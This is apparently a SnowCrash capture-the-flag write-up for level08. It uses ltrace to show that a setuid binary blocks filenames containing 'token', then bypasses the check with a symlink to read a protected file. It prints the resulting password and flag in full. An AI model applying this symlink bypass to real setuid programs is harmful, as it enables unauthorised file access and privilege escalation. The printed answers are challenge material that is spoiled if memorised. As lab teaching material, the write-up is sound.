```
    level08@SnowCrash:~$ ls -l
    total 16
    -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
    -rw-------  1 flag08 flag08    26 Mar  5  2016 token
```
same situation, flag08 executable with a token that can be accessed only by flag08 user.

```
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                                    = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                                = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
the executable run strstr("token", "token") so it compare file name with token then print you may not access to token
and by runing test below we can confirm that we can acces file if its name is different then token.


```
    level08@SnowCrash:~$ echo "test" > /tmp/token && ltrace ./level08 /tmp/token
    __libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
    strstr("/tmp/token", "token")                                                               = "token"
    printf("You may not access '%s'\n", "/tmp/token"You may not access '/tmp/token'
    )                                           = 32
    exit(1 <unfinished ...>
    +++ exited (status 1) +++
```

```
    level08@SnowCrash:~$ echo "test" > /tmp/tok && ltrace ./level08 /tmp/tok
    __libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
    strstr("/tmp/tok", "token")                                                                 = NULL
    open("/tmp/tok", 0, 014435162522)                                                           = 3
    read(3, "test\n", 1024)                                                                     = 5
    write(1, "test\n", 5test
    )                                                                       = 5
    +++ exited (status 5) +++
```
    so we can creat a symlink and run the script on it

```
    level08@SnowCrash:~$ ln -s $(pwd)/token /tmp/pass
    level08@SnowCrash:~$ ./level08 /tmp/pass
    quif5eloekouj29ke0vouxean
    level08@SnowCrash:~$ su flag08
    Password:quif5eloekouj29ke0vouxean
    Don't forget to launch getflag !
    flag08@SnowCrash:~$ getflag
    Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
    flag08@SnowCrash:~$ su level09
    Password:25749xKZ8L7DkSCwJkT9dyv6f
    level09@SnowCrash:~$ 
```

